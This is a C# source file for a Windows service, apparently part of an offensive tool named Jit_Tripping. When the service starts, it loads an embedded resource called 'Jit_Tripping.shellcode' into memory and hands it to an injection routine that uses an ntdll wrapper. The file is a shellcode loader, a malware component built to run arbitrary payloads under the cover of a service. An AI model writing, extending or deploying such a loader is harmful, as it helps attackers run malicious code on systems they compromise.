using System;
using System.ServiceProcess;
using System.Runtime.InteropServices;
//using System.Threading;
using System.Diagnostics;
using System.Text;
using System.Net;
using System.Timers;
using System.Reflection;
using System.Linq;
using System.Runtime.CompilerServices;
using System.IO;
namespace Jit_Tripping
{
    class WinService : ServiceBase
    {
        public const string _ServiceName = "doesntmatter";

        static void Main(string[] args)
        {
            Run(new WinService());
        }

        public WinService()
        {
            ServiceName = _ServiceName;
        }

        protected override void OnStart(string[] args)
        {
            dll ntdll = new dll();
            byte[] bytes = new byte[] {};
            string [] resource_names = Assembly.GetExecutingAssembly().GetManifestResourceNames();

            if (resource_names.Contains("Jit_Tripping.shellcode"))
            {
                var ms = new MemoryStream();
                Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Jit_Tripping.shellcode");
                resStream.CopyTo(ms);
                bytes = ms.ToArray();
            } 

            Utils.inject(bytes, ntdll);
        }

        protected override void OnStop()
        {
            base.OnStop();
        }
    }
}

